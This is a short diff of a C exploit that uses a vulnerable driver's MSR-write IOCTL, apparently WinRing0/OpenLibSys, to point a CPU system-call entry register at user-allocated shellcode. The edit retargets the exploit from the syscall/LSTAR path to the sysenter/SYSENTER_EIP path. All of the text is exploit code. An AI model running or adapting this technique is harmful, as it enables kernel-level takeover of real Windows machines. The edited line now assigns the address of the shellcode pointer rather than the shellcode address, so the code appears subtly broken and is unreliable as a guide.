@@ -2,7 +2,7 @@
 
 int main(int argc, char** argv)
 {
-	char unused = 0, output[4096], * shellcode_alloc = 0, syscall[2] = { 0x0F, 0x05 };
+	char unused = 0, output[4096], * shellcode_alloc = 0, syscall[2] = { 0x0F, 0x34 };
 	HANDLE h_driver = (HANDLE)-1;
 	OLS_WRITE_MSR_INPUT input;
 	unsigned long bytes_returned = 0, old_protection = 0;
@@ -42,8 +42,8 @@ int main(int argc, char** argv)
 	*(char*)(shellcode_alloc + 4095) = 0xCC;
 	printf("\n[+] Mapped the shellcode onto the allocated stack memory.");
 
-	input.Register = 0xC0000082;
-	input.Value.QuadPart = (ULONGLONG)((PULONGLONG)shellcode_alloc);
+	input.Register = 0x00000176;
+	input.Value.QuadPart = &shellcode_alloc;
 	printf("\n[+] Initialized input structure.");
 
 	DeviceIoControl(h_driver, IOCTL_WRITE_MSR, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
